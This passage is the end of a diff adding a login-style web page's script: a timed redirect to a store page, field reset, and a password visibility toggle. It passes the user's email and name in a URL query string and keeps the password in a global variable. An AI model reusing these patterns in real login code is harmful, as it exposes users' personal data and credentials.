+      const params = new URLSearchParams(window.location.search);
+      const game   = params.get('game') || '';
+      setTimeout(() => {
+        const targetUrl = `/store.html?email=${encodeURIComponent(email)}&name=${encodeURIComponent(name)}&rented=${encodeURIComponent(game)}`;
+        window.location.href = targetUrl;
+      }, 2400);
+    }
+
+  function resetAll() {
+    ['inp-email','inp-pw'].forEach(id => {
+      const el = document.getElementById(id);
+      el.value = ''; el.classList.remove('filled','err');
+    });
+    ['err-email','err-pw'].forEach(id => setErr(id,''));
+    document.getElementById('pb').style.transition = 'none';
+    document.getElementById('pb').style.width = '0';
+    setTimeout(() => {
+      document.getElementById('pb').style.transition = 'width 2.2s ease';
+    }, 150);
+    window._email = ''; window._pw = '';
+    goStep(0);
+  }
+
+  function togglePw() {
+    const inp = document.getElementById('inp-pw');
+    const icon = document.getElementById('eye');
+    if (inp.type === 'password') {
+      inp.type = 'text';
+      icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
+    } else {
+      inp.type = 'password';
+      icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+    }
+  }
+</script>
+
+</body>
+</html>
